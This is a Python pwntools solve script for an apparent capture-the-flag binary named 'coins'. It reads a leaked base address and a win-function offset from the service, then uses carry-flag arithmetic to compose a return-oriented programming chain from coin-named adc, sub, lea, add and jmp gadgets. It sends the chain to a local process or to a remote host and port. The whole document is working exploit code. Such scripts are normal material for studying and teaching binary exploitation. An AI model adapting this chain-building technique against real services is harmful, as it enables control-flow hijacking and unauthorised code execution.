#!/usr/bin/env python3
import sys

_ARGS = sys.argv[1:]

from pwn import *

exe = ELF("coins")
context.binary = exe

START_OFF = exe.symbols["_start"]  # 0x1000
ANCHOR = exe.symbols["quarter"] + 1337  # lea rax, [rel quarter + 1337]

# All coin-named gadgets
# First adc adds a +1 carry-in, so build(coins - 1)
ADC = {
    ("r8", 1): "croeseid",
    ("r9", 2): "daric",
    ("r10", 4): "siglos",
    ("r11", 8): "karshapana",
    ("r12", 16): "tetradrachm",
    ("r13", 32): "stater",
    ("r14", 64): "obol",
    ("r15", 128): "lepton",
    ("r8", 256): "aureus",
    ("r9", 512): "solidus",
    ("r10", 1024): "denarius",
    ("r11", 2048): "antoninianus",
    ("r12", 4096): "sestertius",
    ("r13", 8192): "florin",
    ("r14", 16384): "sequin",
    ("r15", 32768): "tremissis",
    ("r8", 65536): "dinar",
    ("r8", 131072): "dirham",
    ("r8", 262144): "scudo",
    ("r8", 524288): "thaler",
    ("r9", 131072): "real",
    ("r10", 262144): "piloncitos",
    ("r11", 524288): "koban",
}
SUB = {
    "r9": "loonie",
    "r10": "krugerrand",
    "r11": "sovereign",
    "r12": "drachma",
    "r13": "penny",
    "r14": "nickel",
    "r15": "dime",
}
LEA, ADD, JMP = "quarter", "cent", "shilling"

COINS = [
    (32768, "r15"),
    (16384, "r14"),
    (8192, "r13"),
    (4096, "r12"),
    (1024, "r10"),
    (512, "r9"),
    (128, "r15"),
    (64, "r14"),
    (32, "r13"),
    (16, "r12"),
    (4, "r10"),
    (2, "r9"),
]


def build(delta):
    c = delta & 1
    b = next(x for x in (0, 1) if not (256 * x + c - delta) % 0x10000 & 0x100)
    R = (256 * b + c - delta) % 0x10000
    T = delta + R - 256 * b - c
    high = []

    for v in (524288, 262144, 131072, 65536):
        n, T = divmod(T, v)
        high += [ADC[("r8", v)]] * n

    regs = []

    for v, reg in COINS:
        n, R = divmod(R, v)
        if n:
            regs.append((reg, v, n))

    return (
        [LEA]
        + high
        + [ADC[("r8", 256)]] * b
        + [ADC[("r8", 1)]] * c
        + sum(([ADC[(reg, v)]] * n for reg, v, n in regs), [])
        + [SUB[reg] for reg in dict.fromkeys(r for r, _, _ in regs)]
        + [ADD, JMP]
    )


def conn():
    if args.LOCAL:
        return process([exe.path])

    # usage: `./solve.py LOCAL` or `./solve.py <host> <port>`
    host = _ARGS[0] if len(_ARGS) > 0 else "127.0.0.1"
    port = int(_ARGS[1]) if len(_ARGS) > 1 else 4919
    return remote(host, port)


def main():
    io = conn()

    io.recvuntil(b"0x")
    base = int(io.recvuntil(b"\n")[:-1], 16)

    io.recvuntil(b"0x")
    win_off = int(io.recvuntil(b"\n")[:-1], 16)

    io.clean()

    delta = win_off - ANCHOR
    log.info(f"{base=:#x}\n{win_off=:#x}\n{delta=:#x}")

    exe.address = base
    rop = ROP(exe)

    # first adc eats +1 because carry flag is initialized to 1
    for g in build(delta - 1):
        rop.raw(exe.symbols[g])

    print("Chain:\n==================\n" + rop.dump())
    io.send(rop.chain())
    print("==================")

    print(io.clean().decode())


if __name__ == "__main__":
    main()
